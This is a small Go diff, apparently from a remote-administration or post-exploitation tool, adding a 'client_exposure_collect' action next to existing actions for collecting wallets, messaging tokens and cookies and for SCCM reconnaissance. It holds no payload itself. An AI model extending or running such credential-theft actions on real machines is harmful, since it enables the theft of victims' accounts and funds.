@@ -205,6 +205,8 @@ func buildQuickActionCommand(action, param, shell string) (string, string) {
 		return "wallet_collect", ""
 	case "messaging_token_collect":
 		return "messaging_token_collect", ""
+	case "client_exposure_collect":
+		return "client_exposure_collect", ""
 	case "cookie_export":
 		return "cookie_export", "all"
 	case "sccm_recon":
